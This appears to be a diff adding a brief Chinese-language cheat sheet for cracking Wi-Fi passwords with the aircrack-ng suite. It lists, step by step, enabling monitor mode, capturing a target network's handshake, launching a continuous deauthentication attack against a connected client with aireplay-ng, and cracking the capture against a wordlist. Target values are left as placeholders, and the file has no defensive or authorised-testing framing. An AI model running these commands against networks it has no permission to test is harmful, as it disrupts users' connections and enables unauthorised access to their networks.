@@ -1,0 +1,10 @@
+开启监听模式
+airmon-ng start ***
+开始监听
+airodump-ng ***
+抓包
+airodump-ng -c ?? --bssid ??:??:??:??:??:?? -w /weizhi ***
+攻击
+aireplay-ng -0 0 -a 主MAC -c 连接MAC ***
+破解
+aircrack-ng -w 字典 ??.cap
